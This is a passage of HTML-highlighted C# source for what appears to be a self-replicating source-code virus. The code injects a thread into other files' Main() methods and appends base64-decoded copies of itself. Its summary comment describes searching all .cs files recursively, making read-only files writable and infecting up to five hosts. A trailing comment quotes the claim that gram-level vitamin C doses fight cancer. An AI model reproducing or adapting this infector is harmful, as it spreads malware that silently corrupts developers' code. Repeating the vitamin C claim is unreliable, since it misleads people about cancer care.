            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">bool</span><span class="sc0"> </span><span class="sc11">Query</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">file</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">database</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">ToLower</span><span class="sc10">().</span><span class="sc11">IndexOf</span><span class="sc10">(</span><span class="sc6">"main("</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">yy</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">char</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">xx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">ToCharArray</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xx</span><span class="sc10">[</span><span class="sc11">yy</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'{'</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">yy</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">x</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">yy</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"Main(string[] args)\r\n\t{\r\n\tSystem.Threading.Thread gxzxzxzxz = new System.Threading.Thread(IsKing.LetsGo);\r\n\tgxzxzxzxz.Start();"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Replace</span><span class="sc10">(</span><span class="sc6">"using System;"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"using System;\r\nusing Sun.Microsystems.Java;"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">using</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">StreamWriter</span><span class="sc0"> </span><span class="sc11">sw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">new</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">StreamWriter</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">))</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">database</span><span class="sc10">.</span><span class="sc11">Split</span><span class="sc10">(</span><span class="sc11">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc7">'&gt;'</span><span class="sc0"> </span><span class="sc10">});</span><span class="sc0">
                </span><span class="sc11">sw</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">sw</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">sw</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">decodeb64</span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">])+</span><span class="sc0"> </span><span class="sc11">database</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">decodeb64</span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]));</span><span class="sc0">
                </span><span class="sc11">sw</span><span class="sc10">.</span><span class="sc11">WriteLine</span><span class="sc10">(</span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">private</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">decodeb64</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc11">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">g</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">FromBase64String</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">);</span><span class="sc0">
              </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">Text</span><span class="sc10">.</span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">UTF8</span><span class="sc10">.</span><span class="sc11">GetString</span><span class="sc10">(</span><span class="sc11">g</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc2">// Summary
</span><span class="sc0">
</span><span class="sc2">//  1.) Make a thread for embedder process.
//      2.) Start thread.
//      3.) Get where the source is executing
//      4.) Get root directory 
//      5.) Do a recursive search of all *.cs files from root directory and beyond
//      6.) Make read-only sources writable.
//      6.) Examine file if its infected.
//      7.) Examine file if it can be infected.
//      8.) If it's not infected and it can be infected.
//          a.) Modify the text stream by replacing "using System;"
//          b.) Modify the text stream by replacing "Main(...){"
//            Otherwise, next file.
//      9.) Entry point has been set and file is ready to be closed.
//      10.) Append a copy of itself to the host. Record how many times the cycle has happened. 
//      11.) If we got 5 hosts, ignore others and terminate.
</span><span class="sc0">
</span><span class="sc2">// A demo file can be found at "\StringCopy.zip"
</span><span class="sc0">
</span><span class="sc1">/*

oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
   "don't call me scarface."                         linuspauling (http://bangingatbang.land.ru)
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo

*/</span><span class="sc0">

</span><span class="sc1">/*
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
Dr. Linus Pauling on vitamin C
------------------------------
Dr. Linus Pauling, often referred to as the "Father of Vitamin C" and twice awarded the Nobel Prize, 
declared that large intakes of up to 10 grams of vitamin C each day aids anti-cancer activity within 
the body.   

Pauling was largely ridiculed for making these declarations, but today, large doses of Vitamin C are 
used by many practitioners for cancer patients in nutritional therapies, who believe Pauling was right 
and that vitamin C is indispensable to the body in its fight to regain health from cancer.

(http://www.healingdaily.com/detoxification-diet/vitamin-c.htm)
ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
*/</span><span class="sc0">
</span></div></body>
</html>
